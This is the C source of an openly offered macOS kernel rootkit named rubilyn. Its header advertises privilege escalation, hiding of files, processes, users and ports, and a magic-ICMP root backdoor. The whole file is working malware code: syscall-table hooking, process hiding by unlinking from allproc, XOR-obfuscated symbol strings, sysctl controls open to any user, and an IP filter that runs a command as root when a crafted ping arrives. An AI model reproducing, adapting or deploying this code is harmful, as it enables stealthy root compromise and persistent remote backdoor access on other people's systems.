/*
                        .o8        o8o  oooo                          
                       "888        `"'  `888                          
  oooo d8b oooo  oooo   888oooo.  oooo   888  oooo    ooo ooo. .oo.   
  `888""8P `888  `888   d88' `88b `888   888   `88.  .8'  `888P"Y88b  
   888      888   888   888   888  888   888    `88..8'    888   888  
   888      888   888   888   888  888   888     `888'     888   888  
  d888b     `V88V"V8P'  `Y8bod8P' o888o o888o     .8'     o888o o888o 
                                            .o..P' HARDCORE EST. 1983 
                                            `Y8P'                   
 
  64bit Mac OS-X kernel rootkit that uses no hardcoded address
  to hook the BSD subsystem in all OS-X Lion & below. It uses a
  combination of syscall hooking and DKOM to hide activity on a 
  host. String resolution of symbols no longer works on Mountain
  Lion as symtab is destroyed during load, this code is portable
  on all Lion & below but requires re-working for hooking under
  Mountain Lion.
 
  Features:
  * works across multiple kernel versions (tested 11.0.0+)
  * give root privileges to pid
  * hide files / folders  
  * hide a process
  * hide a user from 'who'/'w'
  * hide a network port from netstat
  * sysctl interface for userland control 
  * execute a binary with root privileges via magic ICMP ping  

  greetingz to #nullsecurity crew, snare, dino, nemo, thegrugq,
  piotr & friendz!

  -- prdelka
 
*/
#include "internals.h"

uint64_t KERNEL_BASE;

/* ICMP backdoor configuration */
#define MAGIC_ICMP_TYPE 0
#define MAGIC_ICMP_CODE 255 /* xor'd magic word*/
#define MAGIC_ICMP_STR "\x27\x10\x3\xb\x46\x8\x1c\x10\x1e"
#define MAGIC_ICMP_STR_LEN 9
#define IP_BUF_SIZE 24 

/* maximums for buffer sizes */
#define MAX_HIDDEN_PROCESS 256
#define MAXBUFFER 2048
#define MAXHIDELEN 256
#define MAXCMDPATHLEN MAXPATHLEN

/* string XOR key */
char* key = "I never seem to have anything that if I lost it I’d care too much about.";

/* dynamic resolution of kernel symbols - props to snare for the technique */
uint64_t find_symbol(char* symbolname)
{
    uint64_t p;
    int nsyms;
    uint64_t linkedit; 
    uint64_t stringtable = 0;
    uint64_t string;
    struct mach_header_64* mach_kernel;
    struct load_command* load_cmd;
    struct segment_command_64* segment_cmd;
    struct symtab_command* symtab;
    struct nlist_64* symbol;
    uint64_t retvalue = 0;
   
    mach_kernel = (struct mach_header_64*) KERNEL_BASE;
    p = KERNEL_BASE+sizeof(struct mach_header_64);        
    for(int i = 0;i < mach_kernel->ncmds;i++){
        load_cmd =  (struct load_command*)p;
        if(load_cmd->cmd == LC_SEGMENT_64){
            segment_cmd = (struct segment_command_64*)p;
            if(strncmp(segment_cmd->segname,linkeditstr,strlen(segment_cmd->segname))==0){
                linkedit = segment_cmd->vmaddr;
                stringtable += linkedit;
            }
        }
        if(load_cmd->cmd == LC_SYMTAB){
            symtab = (struct symtab_command*)p;
            stringtable += (symtab->stroff - symtab->symoff);
            nsyms = symtab->nsyms;
        }
        p+=load_cmd->cmdsize;
    }
    if(linkedit){
        for(int i = 0;i < nsyms;i++){
            p = linkedit + (sizeof(struct nlist_64) * i);
            symbol = (struct nlist_64*)p;
            string = stringtable + symbol->n_un.n_strx;
            if(strncmp((char*)string,symbolname,strlen((char*)string))==0){
                retvalue = symbol->n_value;
            }
        }
    }
    return retvalue;
}

/* locate the kernel base address from IDT */
uint64_t smashASLR()
{
    uint8_t idtr[10];
    uint64_t idt = 0;
    __asm__ volatile ("sidt %0": "=m" (idtr));
    idt = *((uint64_t *) &idtr[2]);
    struct descriptor_idt *int80_descriptor = NULL;
    uint64_t int80_address = 0;
    uint64_t high = 0;
    uint32_t middle = 0;
    int80_descriptor = _MALLOC(sizeof(struct descriptor_idt),M_TEMP,M_WAITOK);
    bcopy((void*)idt,int80_descriptor,sizeof(struct descriptor_idt));
    high = (unsigned long)int80_descriptor->offset_high << 32;
    middle = (unsigned int)int80_descriptor->offset_middle << 16;
    int80_address = (uint64_t)(high + middle + int80_descriptor->offset_low);
    uint64_t temp_address = int80_address;
    uint8_t *temp_buffer = _MALLOC(4,M_TEMP,M_WAITOK);
    while (temp_address > 0)
    {
        bcopy((void*)temp_address,temp_buffer,4);
        if (*(uint32_t*)(temp_buffer) == MH_MAGIC_64)
        {
            KERNEL_BASE = temp_address;
            return 0;
        }
        temp_address -= 1;
    }
    /* if this does not succeed we experience PANIC pain. */
    return -1;
}

static struct sysent* find_sysent()
{
    struct sysent* table;
    table = (struct sysent *)(((uint64_t)nsysent) -
                              ((uint64_t)sizeof(struct sysent) * (uint64_t)*nsysent));
    if (table[SYS_syscall].sy_narg == 0 &&
        table[SYS_exit].sy_narg == 1  &&
        table[SYS_fork].sy_narg == 0 &&
        table[SYS_read].sy_narg == 3 &&
        table[SYS_wait4].sy_narg == 4 &&
        table[SYS_ptrace].sy_narg == 4)
    {
        return table;
    }
    else
        return NULL;
}

static int getroot(int pid)
{
    struct proc *rootpid;
    kauth_cred_t creds;
    rootpid = proc_find(pid);
    if(!rootpid)
        return 0;
    lck_mtx_lock((lck_mtx_t*)&rootpid->p_mlock);
    creds = rootpid->p_ucred;
    creds = my_kauth_cred_setuidgid(rootpid->p_ucred,0,0); 
    rootpid->p_ucred = creds;
    lck_mtx_unlock((lck_mtx_t*)&rootpid->p_mlock);
    return 0;
}

/* sysctl mib variables */
static int k_pid = 0;        
static int k_pid2 = 0;
static int k_pid3 = 0;
static u_int8_t k_dir[MAXHIDELEN] = { 0x01,0x00 };
static u_int8_t k_cmd[MAXCMDPATHLEN] = { 0x01,0x00 };
static u_int8_t k_user[MAXBUFFER] =  { 0x01,0x00 };
static u_int8_t k_port[MAXBUFFER] =  { 0x01,0x00 };   

/* construct a node (debug.rubilyn) from which other sysctl objects can hang.*/
SYSCTL_NODE(_debug,OID_AUTO,rubilyn,CTLFLAG_RW,0,"");

/* prototypes for read/write handling functions for our sysctl nodes. */
static int sysctl_rubilyn_pid SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_pid2 SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_pid3 SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_dir SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_cmd SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_user SYSCTL_HANDLER_ARGS;
static int sysctl_rubilyn_port SYSCTL_HANDLER_ARGS;

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,pid,
            (CTLTYPE_INT|CTLFLAG_RW|CTLFLAG_ANYBODY),
            &k_pid,0,sysctl_rubilyn_pid,"IU","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,pid2,
            (CTLTYPE_INT|CTLFLAG_RW|CTLFLAG_ANYBODY),
            &k_pid2,0,sysctl_rubilyn_pid2,"IU","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,pid3,
            (CTLTYPE_INT|CTLFLAG_RW|CTLFLAG_ANYBODY),
            &k_pid3,0,sysctl_rubilyn_pid3,"IU","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,dir,
            (CTLTYPE_STRING|CTLFLAG_RW|CTLFLAG_ANYBODY), 
            &k_dir,MAXHIDELEN,sysctl_rubilyn_dir,"A","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,cmd,
            (CTLTYPE_STRING|CTLFLAG_RW|CTLFLAG_ANYBODY), 
            &k_cmd,MAXCMDPATHLEN,sysctl_rubilyn_cmd,"A","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,user,
            (CTLTYPE_STRING|CTLFLAG_RW|CTLFLAG_ANYBODY), 
            &k_user,MAXBUFFER,sysctl_rubilyn_user,"A","");

SYSCTL_PROC(_debug_rubilyn,OID_AUTO,port,
            (CTLTYPE_STRING|CTLFLAG_RW|CTLFLAG_ANYBODY), 
            &k_port,MAXBUFFER,sysctl_rubilyn_port,"A","");

static int sysctl_rubilyn_pid SYSCTL_HANDLER_ARGS 
{
    int ret = sysctl_handle_int(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
    getroot(k_pid);
    k_pid = 0; 
    return ret;
}

static int sysctl_rubilyn_pid2 SYSCTL_HANDLER_ARGS 
{
    int ret = sysctl_handle_int(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
    hideproc(k_pid2);
    k_pid2 = 0; 
    return ret;
}

static int sysctl_rubilyn_pid3 SYSCTL_HANDLER_ARGS 
{
    int ret = sysctl_handle_int(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
    unhideproc(k_pid3);
    k_pid3 = 0; 
    return ret;
}

static int sysctl_rubilyn_dir SYSCTL_HANDLER_ARGS
{
    return sysctl_handle_string(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
}

static int sysctl_rubilyn_cmd SYSCTL_HANDLER_ARGS
{
    return sysctl_handle_string(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
}

static int sysctl_rubilyn_user SYSCTL_HANDLER_ARGS
{
    return sysctl_handle_string(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
}

static int sysctl_rubilyn_port SYSCTL_HANDLER_ARGS
{
    return sysctl_handle_string(oidp, oidp->oid_arg1, oidp->oid_arg2, req);
}

/* hooked getdirentries64 and friends */
register_t new_getdirentries64(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval)
{
    int ret; 
    u_int64_t bcount = 0;
    u_int64_t btot = 0;
    size_t buffersize = 0;
    struct direntry *dirp;
    void *mem = NULL;
    int updated = 0;
    ret = org_getdirentries64(p,uap,retval); 
    btot = buffersize = bcount = *retval;    
    if(bcount > 0)
    {
        MALLOC(mem,void *,bcount,M_TEMP,M_WAITOK);
        if(mem == NULL)
            return(ret); 
        copyin(uap->buf, mem, bcount); 
        dirp = mem;
        while(bcount > 0 && dirp->d_reclen > 0)
        {
            if(dirp->d_reclen > 7)
                if(strncmp(dirp->d_name,(char*)&k_dir,strlen((char*)&k_dir)) == 0)
                {
                    char *next = (char *) dirp + dirp->d_reclen;
                    u_int64_t offset = (char *) next - (char *) mem ;
                    bcount -= dirp->d_reclen;
                    btot -= dirp->d_reclen;
                    bcopy(next,dirp,buffersize - offset);
                    updated = 1;
                    continue;
                }
            bcount -= dirp->d_reclen;
            dirp = (struct direntry *) ((char *) dirp + dirp->d_reclen);
        }
        if(updated == 1)
        {
            copyout(mem,uap->buf,btot);
            *retval = btot; 
        }
        FREE(mem,M_TEMP);
    }
    return ret;
}

struct FInfoAttrBuf {
    u_int32_t       length;
    attrreference_t name;
    fsobj_type_t    objType;
    char            finderInfo[32];
    u_int32_t       dirStatus;
} __attribute__((aligned(4), packed));
typedef struct FInfoAttrBuf FInfoAttrBuf;

register_t new_getdirentriesattr(struct proc *p, struct getdirentriesattr_args *uap, register_t *retval)
{
    struct FInfoAttrBuf *dirp;
    register_t ret; 
    int removed = 0;
    u_int count = 0;
    size_t buffersize = 0;
    void *mem = NULL;
    ret = org_getdirentriesattr(p,uap,retval);
    copyin(uap->count,&count,sizeof(u_int));
    buffersize = uap->buffersize;
    if(count > 0 && buffersize > 0)
    {
        MALLOC(mem,void *,buffersize,M_TEMP,M_WAITOK);        
        if(mem == NULL)
            return(ret);
        copyin(uap->buffer, mem, buffersize); 
        dirp = (struct FInfoAttrBuf *) mem;     
        while(count > 0)
        { 
            char *name = ((char *) &dirp->name + dirp->name.attr_dataoffset);
            if(dirp->name.attr_length > 7)
                if(strncmp(name,(char*)&k_dir,strlen((char*)&k_dir)) == 0)
                {
                    char *next = ((char *) dirp + dirp->length);
                    u_int64_t offset = (char *) next - (char *) mem;
                    bcopy(next,dirp,buffersize - offset);
                    removed++;
                    count--;
                    if(count == 0)
                        break;
                    continue;
                }
            dirp = (struct FInfoAttrBuf *) ((char *) dirp + dirp->length);  
            count--;
        }
        if(removed > 0)
        {
            copyin(uap->count,&count,sizeof(u_int));
            count -= removed;
            copyout(&count,uap->count,sizeof(u_int));
            copyout(mem,uap->buffer, buffersize); 
        }
        FREE(mem,M_TEMP);
    }
    return ret;
}

static ipfilter_t ip_filter_ipv4_ref = NULL;

static errno_t ipf_input(void* cookie, mbuf_t *data, int offset, u_int8_t protocol)
{
    char buf[IP_BUF_SIZE];
    struct icmp *icmp;
    if (!(data && *data))
		return 0;
	if (protocol != IPPROTO_ICMP)
		return 0;
    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);
    icmp = (struct icmp *)&buf;
    if(icmp->icmp_type==MAGIC_ICMP_TYPE&&icmp->icmp_code== MAGIC_ICMP_CODE && strncmp(icmp->icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==0)
    {
        my_KUNCExecute((char*)&k_cmd, kOpenAppAsRoot, kOpenApplicationPath);
    }
    return 0;
}

static errno_t ipf_output(void* cookie, mbuf_t *data, ipf_pktopts_t options)
{
	return 0;
}

static void ipf_detach(void* cookie)
{
}

static struct ipf_filter ip_filter_ipv4 = {
	.name		= "rubilyn",
	.ipf_input	= ipf_input,
	.ipf_output	= ipf_output,
	.ipf_detach	= ipf_detach,
};


int hidden_p_count = 0;
struct proc* hidden_p[MAX_HIDDEN_PROCESS];

/* modify allproc to hide a specific pid */
static int hideproc(int pid)
{
    struct proc* p;
    if(pid!=0){
        for (p = my_allproc->lh_first; p != 0; p = p->p_list.le_next) 
        {
            if(pid == p->p_pid)
            {
                if(hidden_p_count < MAX_HIDDEN_PROCESS)
                {
                    hidden_p[hidden_p_count]=p;
                    hidden_p_count++;   
                    my_proc_list_lock();
                    LIST_REMOVE(p, p_list); 
                    my_proc_list_unlock();
                }
            }
        }
    }
    return 0;
}

/* put the proc back via deceptikom */
static int unhideproc(int pid)
{
    struct proc* p;
    int count;
    if(pid!=0){
        if(hidden_p_count > 0)   
        {
            for(count = 0;count < hidden_p_count;count++) // 1t
            {
                p = hidden_p[count]; 
                if(pid == p->p_pid)
                {
                    my_proc_list_lock();
                    LIST_INSERT_HEAD(my_allproc,p,p_list);
                    my_proc_list_unlock();
                    hidden_p_count--;
                }  
            }
        }
    }
    return 0;
}

/* XOR string crypt routine. */
char* string_hide(char* string,int len,char* key){
    int key_count = 0;
    int byte;
    char* new_string = _MALLOC(len+1,M_TEMP,M_WAITOK);
    if(new_string){
        memset(new_string,0,len+1);
        for(int i = 0;i < len;i++){
            byte = (int)string[i];
            byte = byte ^ (int)key[key_count];
            memcpy((void*)(uint64_t)new_string+i,&byte,sizeof(char));
            key_count++;
            if(key_count == strlen(key)){
                key_count = 0;
            }
        }
        return new_string;
    } 
    return 0;
}

/* greetz nemo & stealth ;-) */
char *my_strstr(char *s, char *find)
{
    register char c, sc;
    register size_t len;
    if ((c = *find++) != 0) {
        len = strlen(find);
        do {
            do {
                if ((sc = *s++) == 0)
                    return (NULL);
            } while (sc != c);
        } while (strncmp(s, find, len) != 0);
        s--;
    }
    return ((char *)s);
}

/* the string value decryptor routine */
int string_handler(){
    char* symbol;
    linkeditstr = string_hide("\x16\x7f\x22\x2c\x38\x2e\x37\x64\x3a\x31",10,key);
    if(linkeditstr){
        symbol = string_hide("\x16\x4e\x1d\x1c\x5\x0\x1c\x54",8,key);
        if(symbol){
            nsysent = (uint64_t*)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x4c\xd\xe\x29\x8\x6\x58\x2c\x9\xa\xe\x4b",13,key);
        if(symbol){
            my_lck_mtx_lock = (lck_mtx_lockp)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x4b\xf\x10\x2\xd\x2d\x43\x1\x0\x1\x32\x53\x11\x1b\x55\x1\x5\x11\xc\x44",21,key);
        if(symbol){
            my_kauth_cred_setuidgid = (kauth_cred_setuidgidp)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x4c\xd\xe\x29\x8\x6\x58\x2c\x10\xb\x1\x4f\x17\x4",15,key);
        if(symbol){
            my_lck_mtx_unlock = (lck_mtx_unlockp)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x6b\x3b\x2b\x35\x20\xa\x45\x10\x10\x11\x8",12,key);
        if(symbol){
            my_KUNCExecute = (KUNCExecutep)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x50\x1c\xa\x15\x3a\x1e\x49\x0\x11\x3a\x1\x4f\x17\x4",15,key);
        if(symbol){
            my_proc_list_lock = (proc_list_lockp)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x50\x1c\xa\x15\x3a\x1e\x49\x0\x11\x3a\x18\x4e\x18\x0\x43\x3",17,key);
        if(symbol){
            my_proc_list_unlock = (proc_list_unlockp)find_symbol(symbol);
        }
        else{
            return -1;
        }
        symbol = string_hide("\x16\x41\x2\x9\x6\x17\x1d\x43",8,key);
        if(symbol){
            my_allproc = (struct proclist*)find_symbol(symbol);
        }
        else{
            return -1;
        }
    }
    else{
        /* fatal couldn't try to search symbols */
        return -1;
    }
    /* resident strings */
    sysctl = string_hide("\x3a\x59\x1d\x6\x2\x9",6,key);
    rubilyn = string_hide("\x3b\x55\xc\xc\x1a\x1c\x1c",7,key);
    kextstat = string_hide("\x22\x45\x16\x11\x5\x11\x13\x54",8,key);
    netstat = string_hide("\x27\x45\x1a\x16\x2\x4\x6",7,key);
    w = string_hide("\x3e",1,key);
    who = string_hide("\x3e\x48\x1",3,key);
    grep = string_hide("\x2e\x52\xb\x15",4,key);
    icmpstr = string_hide(MAGIC_ICMP_STR,MAGIC_ICMP_STR_LEN,key);
    if(!sysctl||!rubilyn||!kextstat||!netstat||!w||!who||!grep||!icmpstr){
        return -1;
    }
    return 0;
}

/* hooked write_nocancel for hiding console stuff */
int new_write_nocancel(struct proc* p, struct write_nocancel_args *uap, user_ssize_t* retval)
{
    char buffer[MAXBUFFER];
    if(strncmp(p->p_comm, grep, strlen(p->p_comm))==0||strncmp(p->p_comm, sysctl,strlen(p->p_comm))==0||
       strncmp(p->p_comm, kextstat,strlen(p->p_comm))==0){
        bzero(buffer, sizeof(buffer));
        copyin(uap->cbuf, buffer, sizeof(buffer)-1);
        if(my_strstr(buffer, rubilyn))	
            return(uap->nbyte);
    }
    if(strncmp(p->p_comm, netstat,strlen(p->p_comm))==0){
        bzero(buffer, sizeof(buffer));
        copyin(uap->cbuf, buffer, sizeof(buffer)-1);
        if(my_strstr(buffer, (char*)&k_port))	
            return(uap->nbyte);
	}
	if((strncmp(p->p_comm,w,strlen(p->p_comm))==0||strncmp(p->p_comm,who,strlen(p->p_comm))==0))
    {
        bzero(buffer, sizeof(buffer));
        copyin(uap->cbuf, buffer, sizeof(buffer)-1);
        if(my_strstr(buffer, (char*)&k_user))	
            return(uap->nbyte);
    }
    return org_write_nocancel(p,uap,retval);
}

/* kext start function */
kern_return_t rubilyn_start(kmod_info_t * ki, void *d)
{
    smashASLR();
    struct sysent *table;    
    if(string_handler()==0)
    {
        if(nsysent){
            table = find_sysent();
            if(table){
                /* back up original syscall pointers */    
                org_getdirentries64 = (void *) table[SYS_getdirentries64].sy_call; 
                org_getdirentriesattr = (void *) table[SYS_getdirentriesattr].sy_call; 
                org_write_nocancel = (void *) table[SYS_write_nocancel].sy_call;
                /* replace syscalls in syscall table */
                table[SYS_getdirentries64].sy_call = (void *) new_getdirentries64;
                table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;
                table[SYS_write_nocancel].sy_call = (void *) new_write_nocancel;
                /* register our sysctl entries */
                sysctl_register_oid(&sysctl__debug_rubilyn);
                sysctl_register_oid(&sysctl__debug_rubilyn_pid);
                sysctl_register_oid(&sysctl__debug_rubilyn_pid2);
                sysctl_register_oid(&sysctl__debug_rubilyn_pid3);
                sysctl_register_oid(&sysctl__debug_rubilyn_dir);
                sysctl_register_oid(&sysctl__debug_rubilyn_cmd);
                sysctl_register_oid(&sysctl__debug_rubilyn_user);
                sysctl_register_oid(&sysctl__debug_rubilyn_port);
                /* install IPv4 filter hook */
               ipf_addv4(&ip_filter_ipv4, &ip_filter_ipv4_ref);
            }
            else{
                return KERN_FAILURE;
            }
        }
        else{
            return KERN_FAILURE;
        }
    }
    else{
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

/* kext stop called on unload */
kern_return_t rubilyn_stop(kmod_info_t *ki, void *d)
{
    /* clean up */
    struct sysent *table;
    table = find_sysent();
    if(table){
        table[SYS_getdirentries64].sy_call = (void *) org_getdirentries64;
        table[SYS_getdirentriesattr].sy_call = (void *) org_getdirentriesattr; 
        table[SYS_write_nocancel].sy_call = (void*) org_write_nocancel;
        sysctl_unregister_oid(&sysctl__debug_rubilyn_pid3);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_pid2);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_pid);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_dir);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_cmd);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_user);
        sysctl_unregister_oid(&sysctl__debug_rubilyn_port);
        sysctl_unregister_oid(&sysctl__debug_rubilyn);
        ipf_remove(ip_filter_ipv4_ref);
    }
    else{
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}
